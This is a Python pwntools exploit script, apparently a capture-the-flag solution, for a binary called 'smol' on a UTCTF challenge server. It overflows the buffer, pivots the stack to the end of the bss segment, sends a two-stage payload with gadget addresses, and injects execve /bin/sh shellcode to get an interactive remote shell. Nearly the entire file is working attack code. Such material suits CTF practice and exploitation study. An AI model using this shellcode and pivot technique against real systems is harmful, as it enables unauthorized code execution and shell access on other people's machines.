# RazviOverflow
# Python3
from pwn import *

end_bss_address = 0x402010
new_rbp_value = p64(end_bss_address)
mov_rsp_rbp_pop_rbp_ret = p64(0x000000000040101e)

lea_rdi_var_8h = p64(0x00401015)

static = ELF("./smol")
main_address = p64(static.symbols['main'])

binary = process("./smol")
binary = remote("pwn.utctf.live", 9998)

#gdb.attach(binary.pid,'''
	#b *0x0040101e
	#c
#	''')

shellcode = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

#1st iteration
payload_0 = b"A"*8 + p64(end_bss_address+0x8) + lea_rdi_var_8h 

#2nd iteration
payload_1 = b"A"*8 + b"B"*8 + p64(end_bss_address+0x18) + shellcode


with open("input", "wb") as file:
	file.write(payload_0+b"A"*(0x200-len(payload_0)))
	file.write(payload_1+b"\x00"*(0x200-len(payload_1)))

binary.sendline(payload_0)
binary.sendline(payload_1)

binary.interactive()